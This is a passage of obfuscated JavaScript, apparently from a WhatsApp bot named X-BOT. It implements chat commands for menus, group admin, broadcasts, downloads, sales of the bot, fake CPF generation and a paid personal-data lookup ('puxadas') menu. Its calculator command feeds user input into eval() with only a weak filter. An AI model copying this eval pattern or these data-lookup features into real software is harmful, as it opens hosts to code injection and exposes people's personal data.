                          display_text: "⟩ 𝘾𝙍𝙄𝘼𝘿𝙊𝙍 ⟨",
                          merchant_url: "https://wa.me/+553299240466?text= Bot: " + NomeDoBot + " Ola Jeff ",
                          url: "https://wa.me/+553299240466?text= Bot: " + NomeDoBot + " Ola Jeff "
                        })
                      }]
                    }
                  }
                }, {});
              } else {
                const _0x5d4bb5 = "\n       \n╭───────────────┐\n├ INFORMAÇÕES DO MEU CRIADOR OFC\n├───────────────\n│ Solicitou o CMD: @" + _0x32e455.split("@")[0] + "\n├───────────────┐\n├ NICK CRIADOR: @JEFFERSON_DDOS\n│\n│ NUMERO: wa.me/553299240466\n│\n╰─────────────╯\n    ";
                const _0x35f906 = "https://telegra.ph/file/eb2db630bb2b6ba6ffbd8.jpg";
                const _0x213b1b = {
                  url: _0x35f906
                };
                const _0x2d8a5f = {
                  image: _0x213b1b,
                  caption: _0x5d4bb5,
                  mentions: [_0x32e455]
                };
                const _0x598674 = {
                  quoted: _0xa6b34
                };
                _0x263319.sendMessage(_0x4f1071, _0x2d8a5f, _0x598674);
              }
              break;
            case "comprar_bot":
            case "comprarxbot":
            case "comprarx-bot":
            case "comprarbot":
              const _0x1ebea0 = {
                text: "🛒",
                key: _0x302296.key
              };
              const _0xc55b68 = {
                react: _0x1ebea0
              };
              _0x263319.sendMessage(_0x4f1071, _0xc55b68);
              const _0x4fb5f6 = "\n\n╭───────────────┐\n├ 💻 *COMPRAR X-BOT DESCRIPTOGRAFADO*\n├───────────────\n│ " + _0x6965b0 + " @" + _0x32e455.split("@")[0] + "\n├───────────────┐\n├ 🔧 *Informações da Compra:*\n│ - Bot Completo Descriptografado última versão\n│ - Atualizações Frequentes\n│ - Suporte Técnico e na instalação Incluso\n│\n├ 💰 *Preço:* R$ 75,00\n│\n├ 📲 *Contato Criador:*\n│ wa.me/553299240466\n│\n├ 🔗 *Link para Compra*\n│    *[ CLIQUE ABAIXO ]*\n│ https://api.whatsapp.com/send?phone=553299240466&text=OLA%20DESEJO%20COMPRAR%20O%20X-BOT\n│\n╰─────────────╯\n";
              const _0x4ba17c = "https://telegra.ph/file/4d251574a7d80c3b5683f.jpg";
              const _0x27ccf1 = {
                url: _0x4ba17c
              };
              const _0xa01aad = {
                image: _0x27ccf1,
                caption: _0x4fb5f6,
                mentions: [_0x32e455]
              };
              const _0x4e6d7a = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, _0xa01aad, _0x4e6d7a);
              break;
            case "wa.me":
            case "wame":
              numi = _0x32e455.replace("@s.whatsapp.net", "");
              msg = _0x40e45c.toString().split(",").join("%20").split("@").join("");
              msg1 = msg.replace(numi, "");
              s = msg1.substring(0);
              if (msg.length < 1) {
                return _0x403602("Defina uma mensagem, por exemplo: *" + _0x1d93be + "wame eae gostoso!*");
              }
              toddynho = "https://api.whatsapp.com/send?phone=" + numi + "&text=" + s;
              _0x403602(toddynho);
              break;
            case "alteradores":
            case "alteradoress":
              const _0x534ece = {
                url: logoslink.logo
              };
              const _0x24f183 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, {
                image: _0x534ece,
                caption: alteradores(_0x1d93be, _0x32e455),
                mentions: [_0x32e455]
              }, _0x24f183);
              break;
            case "menubrincadeiras":
            case "menubrincadeira":
            case "brincadeiras":
            case "brincadeira":
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              const _0x280cde = {
                url: logoslink.logo
              };
              const _0x8a2d01 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, {
                image: _0x280cde,
                caption: brincadeiras(_0x1d93be, _0x32e455),
                mentions: [_0x32e455]
              }, _0x8a2d01);
              break;
            case "menupremium":
            case "menuprem":
            case "menuvip":
              try {
                cmdsP = _0x3dc931.map((_0x28612a, _0x11c5c6) => "│❐➦" + (_0x1d93be + _0x28612a)).join("\n");
                if (botoes_) {
                  await _0x263319.relayMessage(_0x4f1071, {
                    interactiveMessage: {
                      body: {
                        text: menuprem(_0x1d93be, _0x32e455, cmdsP)
                      },
                      footer: {
                        text: ""
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "quick_reply",
                          buttonParamsJson: JSON.stringify({
                            display_text: "COMPRAR VIP",
                            id: _0x1d93be + "lojavip",
                            quick_reply: "LOJA VIP"
                          })
                        }]
                      }
                    }
                  }, {});
                } else {
                  const _0x5c8a85 = {
                    url: logoslink.logo
                  };
                  const _0x29e81c = {
                    quoted: _0x302296
                  };
                  await _0x263319.sendMessage(_0x4f1071, {
                    image: _0x5c8a85,
                    caption: menuprem(_0x1d93be, _0x32e455, cmdsP)
                  }, _0x29e81c);
                }
              } catch (_0x2a45c2) {
                _0x403602(_0x2a45c2);
              }
              break;
            case "menuinfos":
              const _0x24987e = {
                url: logoslink.logo
              };
              const _0x581b7b = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, {
                image: _0x24987e,
                caption: menuinfos(_0x1d93be, _0x32e455),
                mentions: [_0x32e455]
              }, _0x581b7b);
              break;
            case "menuia":
              const _0x380b1d = {
                url: logoslink.logo
              };
              const _0x3e4e66 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, {
                image: _0x380b1d,
                caption: menuia(_0x1d93be, _0x32e455),
                mentions: [_0x32e455]
              }, _0x3e4e66);
              break;
            case "menudownloads":
              const _0x32d5d4 = {
                url: logoslink.logo
              };
              const _0x5333a7 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, {
                image: _0x32d5d4,
                caption: menudownloads(_0x1d93be, _0x32e455),
                mentions: [_0x32e455]
              }, _0x5333a7);
              break;
            case "informacoes":
              const _0x48a028 = {
                url: logoslink.logo
              };
              const _0x85375 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, {
                image: _0x48a028,
                caption: informacoes(_0x1d93be, _0x32e455),
                mentions: [_0x32e455]
              }, _0x85375);
              break;
            case "menujogos":
              const _0x17a2cb = {
                url: logoslink.logo
              };
              const _0x2860bc = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, {
                image: _0x17a2cb,
                caption: menujogos(_0x1d93be, _0x32e455),
                mentions: [_0x32e455]
              }, _0x2860bc);
              break;
            case "menufigurinhas":
              const _0x4a3074 = {
                url: logoslink.logo
              };
              const _0xdd76d8 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, {
                image: _0x4a3074,
                caption: menufigurinhas(_0x1d93be, _0x32e455),
                mentions: [_0x32e455]
              }, _0xdd76d8);
              break;
            case "downloadjogos":
              const _0x2b5e31 = {
                url: logoslink.logo
              };
              const _0x49bd13 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, {
                image: _0x2b5e31,
                caption: downloadjogos(_0x1d93be, _0x32e455),
                mentions: [_0x32e455]
              }, _0x49bd13);
              break;
            case "menunsfw":
              const _0x2d1208 = {
                url: logoslink.logo
              };
              const _0x76a93c = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, {
                image: _0x2d1208,
                caption: menunsfw(_0x1d93be, _0x32e455),
                mentions: [_0x32e455]
              }, _0x76a93c);
              break;
            case "outroscmds":
              const _0xa6bde5 = {
                url: logoslink.logo
              };
              const _0x40fb96 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, {
                image: _0xa6bde5,
                caption: outroscmds(_0x1d93be, _0x32e455),
                mentions: [_0x32e455]
              }, _0x40fb96);
              break;
            case "consultas":
            case "puxadas":
              const _0x308d64 = {
                url: logopuxadas.menupuxadas
              };
              const _0x5a6341 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, {
                image: _0x308d64,
                caption: puxadas(_0x1d93be, _0x32e455),
                mentions: [_0x32e455]
              }, _0x5a6341);
              break;
            case "configurar-bot":
              const _0x182d1b = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, {
                text: configbot(_0x1d93be)
              }, _0x182d1b);
              break;
            case "comandos-termux":
              const _0xe69175 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, {
                text: cmd_termux(_0x1d93be)
              }, _0xe69175);
              break;
            case "seguidores-insta":
              const _0x1ea382 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, {
                text: hospedar(_0x1d93be)
              }, _0x1ea382);
              break;
            case "destrava":
              if (!_0x38b1b5 && !_0x150e9e && !_0x35021e) {
                return _0x403602(enviar.msg.premium);
              }
              const _0x1bcad9 = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, {
                text: destrava(_0x1d93be)
              }, _0x1bcad9);
              break;
            case "perfil":
              try {
                pikona = await _0x263319.profilePictureUrl(_0x32e455.split("@")[0] + "@c.us", "image");
              } catch {
                pikona = "https://telegra.ph/file/b5427ea4b8701bc47e751.jpg";
              }
              try {
                var _0x421fc0 = palavrasc[Math.floor(Math.random() * palavrasc.length)];
                const _0x2497b9 = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
                const _0x3e9761 = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
                const _0x4b5443 = _0x2497b9[Math.floor(Math.random() * _0x2497b9.length)];
                const _0x58d2ca = _0x3e9761[Math.floor(Math.random() * _0x3e9761.length)];
                const _0x3823eb = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
                const _0x18343d = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
                const _0x4d3216 = _0x3823eb[Math.floor(Math.random() * _0x3823eb.length)];
                const _0x8ac379 = _0x18343d[Math.floor(Math.random() * _0x18343d.length)];
                const _0x2d536c = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
                const _0x307a01 = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
                const _0x3ff0d0 = _0x2d536c[Math.floor(Math.random() * _0x2d536c.length)];
                const _0x182581 = _0x307a01[Math.floor(Math.random() * _0x307a01.length)];
                gadop = "" + Math.floor(Math.random() * 100);
                const _0x5654cb = Math.ceil(Math.random() * 10000);
                const _0xd4e074 = "     「 🔥 ~_*PERFIL*_~ 🌈 」\n🗒 *Nome* : *" + _0x55a6ac + "*\n🪀 *Número* : @" + _0x32e455.split("@")[0] + "\n🐂 *Nível gado* : *" + _0x4b5443 + _0x58d2ca + "%*\n📱 *Seu Célular* : " + (_0x302296.key.id.length > 21 ? "Android 🤣" : _0x302296.key.id.substring(0, 2) == "3A" ? "IOS😂😂😅" : "Zap zap web 😂😂☝🏼😅") + "\n😈 *Nível puta* : *" + _0x4d3216 + _0x8ac379 + "%*\n😋 *Nível de gostosura* : *" + _0x3ff0d0 + _0x182581 + "%*\n🍼 *Valor do programa* : *R$" + _0x5654cb + "*\n\n➻ *~_CONSELHO_~* :\n" + _0x421fc0;
                const _0x15024a = {
                  url: pikona
                };
                const _0x4b55d9 = {
                  image: _0x15024a,
                  caption: _0xd4e074,
                  mentions: [_0x32e455]
                };
                const _0x2eae0e = {
                  quoted: _0xa6b34
                };
                _0x263319.sendMessage(_0x4f1071, _0x4b55d9, _0x2eae0e);
              } catch (_0x2431bd) {
                console.log(_0x2431bd);
              }
              break;
            case "conselhobiblico":
            case "conselhosbiblico":
            case "conselhosb":
            case "conselhob":
              var _0xee635f = conselhob[Math.floor(Math.random() * conselhob.length)];
              jr = _0x6965b0 + " " + _0x55a6ac + " \n\nConselhos Bíblico para você: \n\n- " + _0xee635f + " \n\n> Bot: " + NomeDoBot + "\n> Grupo: " + _0x471350;
              const _0x1d224f = {
                text: jr
              };
              const _0x4dcdd9 = {
                mentionedJid: jr
              };
              const _0x2244b5 = {
                quoted: _0x302296,
                contextInfo: _0x4dcdd9
              };
              _0x263319.sendMessage(_0x4f1071, _0x1d224f, _0x2244b5);
              break;
            case "tabela":
              const _0x511304 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, {
                text: tabela(_0x1d93be, NomeDoBot)
              }, _0x511304);
              break;
            case "destrava2":
              if (!_0x38b1b5 && !_0x150e9e && !_0x35021e) {
                return _0x403602(enviar.msg.premium);
              }
              const _0x271b66 = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, {
                text: destrava2(_0x1d93be)
              }, _0x271b66);
              break;
            case "infobemvindo":
            case "infobv":
              const _0x52f941 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, {
                text: infobemvindo(_0x1d93be)
              }, _0x52f941);
              break;
            case "idiomas":
            case "idioma":
              txt = "  \nIDIOMAS DO GTTS OU DO TRADUTOR\n\nEXEMPLO :\n\n>> " + _0x1d93be + "gtts pt (texto)\n\no PT que coloquei, é a linguagem, então pode por no lugar as 2 letras que define a linguagem, iguais os exemplos e os idiomas abaixo.\n\n'af': 'Afrikaans',\n'sq': 'Albanian',\n'ar': 'Arabic',\n'hy': 'Armenian',\n'ca': 'Catalan',\n'hr': 'Croatian',\n'cs': 'Czech',\n'da': 'Danish',\n'nl': 'Dutch',\n'en': 'English',\n'eo': 'Esperanto',\n'fi': 'Finnish',\n'fr': 'French',\n'de': 'German',\n'el': 'Greek',\n'ht': 'Haitian Creole',\n'hi': 'Hindi',\n'hu': 'Hungarian',\n'is': 'Icelandic',\n'id': 'Indonesian',\n'it': 'Italian',\n'ja': 'Japanese',\n'ko': 'Korean',\n'la': 'Latin',\n'lv': 'Latvian',\n'mk': 'Macedonian',\n'no': 'Norwegian',\n'pl': 'Polish',\n'pt': 'Portugues',\n'ro': 'Romanian',\n'ru': 'Russian',\n'sr': 'Serbian',\n'sk': 'Slovak',\n'es': 'Spanish',\n'sw': 'Swahili',\n'sv': 'Swedish',\n'ta': 'Tamil',\n'th': 'Thai',\n'tr': 'Turkish',\n'vi': 'Vietnamese',\n'cy': 'Welsh'\n \n🔥" + NomeDoBot + "🔥";
              const _0x107d3e = {
                text: txt
              };
              const _0x1d07c0 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, _0x107d3e, _0x1d07c0);
              break;
            case "infocontador":
            case "infobanghost":
              const _0x590dea = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, {
                text: infocontador(_0x1d93be, _0x55a6ac)
              }, _0x590dea);
              break;
            case "infolistanegra":
              const _0x28c13e = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, {
                text: infolistanegra(_0x1d93be, _0x55a6ac)
              }, _0x28c13e);
              break;
            case "infoaluguel":
              const _0x2ad6fc = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, {
                text: infoaluguel(_0x1d93be, _0x55a6ac)
              }, _0x2ad6fc);
              break;
            case "infotransmitir":
              const _0x38a18d = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, {
                text: infotransmitir(_0x1d93be, _0x55a6ac)
              }, _0x38a18d);
              break;
            case "infopalavrão":
            case "infopalavrao":
              const _0x3c14e1 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, {
                text: infopalavrao(_0x1d93be, _0x55a6ac)
              }, _0x3c14e1);
              break;
            case "infobancarac":
              const _0x9b5a67 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, {
                text: infobancarac(_0x1d93be, _0x55a6ac)
              }, _0x9b5a67);
              break;
            case "git":
            case "git-bot":
            case "gitdobot":
            case "gitbot":
              const _0x4d3f34 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, {
                text: gitdobot(_0x1d93be)
              }, _0x4d3f34);
              break;
            case "mediafire3":
              try {
                if (!_0x1d6557.includes("mediafire.com")) {
                  return _0x403602("Faltando o link do mediafire para download do arquivo, cade?");
                }
                ABC = await fetchJson("https://api.bronxyshost.com.br/api-bronxys/mediafire?url=" + _0x1d6557 + "&apikey=" + _0x44a335);
                _0x403602("Enviando: " + ABC.resultado[0].nama + "\n\nPeso: " + ABC.resultado[0].size);
                const _0x9a411 = {
                  url: ABC.resultado[0].link
                };
                _0x263319.sendMessage(_0x4f1071, {
                  document: _0x9a411,
                  mimetype: "application/" + ABC.resultado[0].mime,
                  fileName: ABC.resultado[0].nama
                }).catch(_0x53926f => {
                  return _0x403602("" + infoerror);
                });
              } catch (_0x4c6795) {
                return _0x403602("" + infoerror);
              }
              break;
            case "mediafire2":
              try {
                if (!_0x1d6557.includes("mediafire.com")) {
                  return _0x403602("Faltando o link do mediafire para download do arquivo, cade?");
                }
                ABC = await fetchJson(SITE_JEFF_APIS + "/api/mediafire?url=" + _0x1d6557 + "&apikey=" + _0x512d5e);
                _0x403602("Enviando: " + ABC.resultado[0].nama + "\n\nPeso: " + ABC.resultado[0].size);
                const _0x1db6d7 = {
                  url: ABC.resultado[0].link
                };
                _0x263319.sendMessage(_0x4f1071, {
                  document: _0x1db6d7,
                  mimetype: "application/" + ABC.resultado[0].mime,
                  fileName: ABC.resultado[0].nama
                }).catch(_0x53fa34 => {
                  return _0x403602("" + infoerror);
                });
              } catch (_0x289eb9) {
                return _0x403602("" + infoerror);
              }
              break;
            case "ler":
            case "ocr":
            case "lerfoto":
              if (!_0x38b1b5 && !_0x2a5ff3) {
                return _0x403602("Só usuário premium pode utilizar este comando..");
              }
              if ((_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) && !_0x1d6557.length <= 1) {
                encmedia = _0x10f925 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : _0x302296.message.imageMessage;
                rane = getRandom("." + (await getExtension(encmedia.mimetype)));
                buffimg = await getFileBuffer(encmedia, "image");
                fs.writeFileSync(rane, buffimg);
                media = rane;
                _0x403602(enviar.espere);
                await recognize(media, {
                  lang: "eng+ind",
                  oem: 1,
                  psm: 3
                }).then(_0x5f2e64 => {
                  _0x403602(_0x5f2e64.trim());
                  DLT_FL(media);
                }).catch(_0x52ac17 => {
                  _0x403602(_0x52ac17.message);
                  DLT_FL(media);
                });
              } else {
                _0x403602("Somente fotos!");
              }
              break;
            case "premiumlista":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              tkks = "╭────*「 *PREMIUM USER👑* 」\n";
              for (let _0x47d677 of premium) {
                tkks += "│+  @" + _0x47d677.split("@")[0] + "\n";
              }
              tkks += "│+ Total : " + premium.length + "\n╰──────*「 *" + NomeDoBot + "* 」*────";
              _0x5b6fe5(tkks.trim());
              break;
            case "getquoted":
            case "getinfo":
            case "get":
              _0x403602(JSON.stringify(_0x302296.message.extendedTextMessage.contextInfo, null, 3));
              break;
            case "get-txt":
              _0x403602(JSON.stringify(_0x302296.message.extendedTextMessage.contextInfo.quotedMessage.conversation, null, 2));
              break;
            case "gerarcpf":
              cp1 = "" + (Math.floor(Math.random() * 300) + 600);
              cp2 = "" + (Math.floor(Math.random() * 300) + 600);
              cp3 = "" + (Math.floor(Math.random() * 300) + 600);
              cp4 = "" + (Math.floor(Math.random() * 30) + 60);
              cpf = cp1 + "." + cp2 + "." + cp3 + "-" + cp4;
              const _0x173bb2 = {
                text: "CPF gerado com sucesso : " + cpf
              };
              const _0x5015a0 = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x173bb2, _0x5015a0);
              break;
            case "cep2":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x44980d = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0xfaa4de = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x44980d, _0xfaa4de);
                let _0xd2820f = await fetchJson(SITE_JEFF_APIS + "/consultas/cep?ddos=" + _0x1d6557 + "&apikey=" + _0x512d5e);
                const _0x14be54 = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\nCEP: " + _0xd2820f.cep + "\nRua: " + _0xd2820f.street + "\nBairro: " + _0xd2820f.neighborhood + "\nCidade: " + _0xd2820f.city + "\nEstado: " + _0xd2820f.state + "\nIBGE: " + _0xd2820f.ibge + "\nGIA: " + _0xd2820f.gia + "\nDDD: " + _0xd2820f.ddd + "\nSIAFI: " + _0xd2820f.siafi + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼 " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x14be54);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x4aa42c = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x4aa42c);
                }
              } catch (_0x2612c3) {
                console.log(_0x2612c3);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "ddd":
              if (_0x40e45c.length < 1) {
                return _0x403602("Use " + (_0x1d93be + _0x3dec88) + " 81");
              }
              ddd = _0x2e320b.slice(5);
              ddds = await axios.get("https://brasilapi.com.br/api/ddd/v1/" + ddd);
              dddlist = "Lista de Cidades de " + ddds.data.state + " com este DDD " + _0x1d6557 + ">\n\n";
              for (let _0x27f79d = 0; _0x27f79d < ddds.data.cities.length; _0x27f79d++) {
                dddlist += _0x27f79d + 1 + " ⪧ *" + ddds.data.cities[_0x27f79d] + "*\n";
              }
              const _0x2d0ba4 = {
                text: dddlist
              };
              const _0x577da4 = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x2d0ba4, _0x577da4);
              break;
            case "encurtalink":
              if (_0x40e45c.length < 1) {
                return _0x403602("Exemplo:\n" + _0x1d93be + "encurtalink https://youtube.com/c/aleatoryconteudos");
              }
              try {
                linki = _0x40e45c[0];
                anu = await axios.get("https://tinyurl.com/api-create.php?url=" + linki);
                _0x403602("" + anu.data);
              } catch (_0xdee1b0) {
                emror = String(_0xdee1b0);
                _0x403602("" + _0xdee1b0);
              }
              break;
            case "calculadora":
            case "calcular":
            case "calc":
              rsp = _0x1d6557.replace("x", "*").replace("\"", ":").replace(new RegExp("[()abcdefghijklmnopqrstwuvxyz]", "gi"), "").replace("÷", "/");
              return _0x403602(JSON.stringify(eval(rsp, null, "\t")));
              break;
            case "nomegp":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              blat = _0x40e45c.join(" ");
              _0x263319.groupUpdateSubject(_0x4f1071, "" + blat);
              const _0x337a4c = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, {
                text: "Sucesso, alterou o nome do grupo"
              }, _0x337a4c);
              break;
            case "descgp":
            case "descriçãogp":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x5c594c);
              }
              blabla = _0x40e45c.join(" ");
              _0x263319.groupUpdateDescription(_0x4f1071, "" + blabla);
              const _0x2bf54e = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, {
                text: "Sucesso, alterou a descrição do grupo"
              }, _0x2bf54e);
              break;
            case "setfotogp":
            case "fotogp":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (!_0x10f925) {
                return _0x403602("Use: " + (_0x1d93be + _0x3dec88) + " <Marque uma foto>");
              }
              ftgp = _0x10f925 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : _0x302296.message.imageMessage;
              rane = getRandom("." + (await getExtension(ftgp.mimetype)));
              buffimg = await getFileBuffer(ftgp, "image");
              fs.writeFileSync(rane, buffimg);
              medipp = rane;
              const _0x25b10d = {
                url: medipp
              };
              _0x263319.updateProfilePicture(_0x4f1071, _0x25b10d);
              _0x403602("Foto do grupo alterada com sucesso");
              break;
            case "linkgp":
            case "linkgroup":
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              linkgc = await _0x263319.groupInviteCode(_0x4f1071);
              _0x403602("https://chat.whatsapp.com/" + linkgc);
              break;
            case "recrutar":
              if (!_0x150e9e && !_0x35021e && !_0x38b1b5) {
                return _0x403602("Só ADM ou premium");
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              rcrt = _0x1d6557.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net";
              linkgc = await _0x263319.groupInviteCode(_0x4f1071);
              const _0xfb604c = {
                url: logoslink.logo
              };
              _0x263319.sendMessage(rcrt, {
                image: _0xfb604c,
                caption: "Clique no símbolo a cima da imagem para entrar no grupo...",
                contextInfo: {
                  externalAdReply: {
                    title: "- Clique aqui para participar do grupo",
                    body: "",
                    reviewType: "PHOTO",
                    thumbnailUrl: logoslink.logo,
                    sourceUrl: "https://chat.whatsapp.com/" + linkgc,
                    mediaType: 2
                  }
                }
              });
              _0x403602("Convite de recrutamento do usuário, foi enviado para o privado dele com sucesso...");
              break;
            case "listatm":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              _0x26cfcd = JSON.parse(fs.readFileSync("./DADOS/TMGP.json"));
              if (_0x26cfcd.length == 0) {
                return _0x403602("Não contém nenhum registro de transmissão, utilize " + _0x1d93be + "rgtm no grupo que deseja que ele receba as transmissões do bot..");
              }
              bl = "_-_-_-_-_-_-_-_-_-_-_-_-\n\n";
              for (_0xc3d45a = 0; _0xc3d45a < _0x26cfcd.length; _0xc3d45a++) {
                bl += _0xc3d45a + 1 + " - ID: " + _0x26cfcd[_0xc3d45a].id + "\n\n- NOME DO USUÁRIO OU GRUPO: " + _0x26cfcd[_0xc3d45a].infonome + "\n\n";
              }
              _0x403602(bl);
              break;
            case "rgtm":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              _0x26cfcd = JSON.parse(fs.readFileSync("./DADOS/TMGP.json"));
              if (JSON.stringify(_0x26cfcd).includes(_0x4f1071)) {
                return _0x403602("Este grupo ja está registrado na lista de transmissão");
              }
              const _0x3c6d96 = {
                id: _0x4f1071,
                infonome: "" + (_0xd20756 ? _0x471350 : _0x55a6ac)
              };
              _0x26cfcd.push(_0x3c6d96);
              fs.writeFileSync("./DADOS/TMGP.json", JSON.stringify(_0x26cfcd));
              _0x403602("Registrado com sucesso, quando for realizada as transmissões, esse grupo/usuário estará na lista.");
              break;
            case "tirardatm":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              _0x26cfcd = JSON.parse(fs.readFileSync("./DADOS/TMGP.json"));
              if (!JSON.stringify(_0x26cfcd).includes(_0x4f1071)) {
                return _0x403602("Este grupo não está registrado para ser tirado da lista de transmissão");
              }
              if (_0x1d6557.trim().length > 4) {
                var _0x513b61 = _0x26cfcd.map(_0x39f104 => _0x39f104.id).indexOf(_0x1d6557.trim());
              } else {
                var _0x513b61 = _0x26cfcd.map(_0xd187d5 => _0xd187d5.id).indexOf(_0x4f1071);
              }
              _0x26cfcd.splice(_0x513b61, 1);
              fs.writeFileSync("./DADOS/TMGP.json", JSON.stringify(_0x26cfcd));
              _0x403602("Grupo/Usuário tirado da lista de transmissão com sucesso");
              break;
            case "fazertm":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              var _0x26cfcd = JSON.parse(fs.readFileSync("./DADOS/TMGP.json"));
              if (_0x26cfcd.lengh == 0) {
                return _0x403602("Não contém nenhum grupo registrado para realizar transmissão");
              }
              await sleep(1000);
              var _0x1dc02e = "";
              var _0x50e057 = _0x302296.message?.extendedTextMessage?.contextInfo?.quotedMessage;
              var _0x4d7bf7 = _0x10f925 ? _0x50e057?.imageMessage : _0x302296.message?.imageMessage;
              var _0x5185f1 = _0x5760e9 ? _0x50e057?.videoMessage : _0x302296.message?.videoMessage;
              var _0xe8e243 = _0x368a3f ? _0x50e057?.textMessage : _0x302296.message?.textMessage;
              var _0x371248 = _0x11898e ? _0x50e057?.documentMessage : _0x302296.message?.documentMessage;
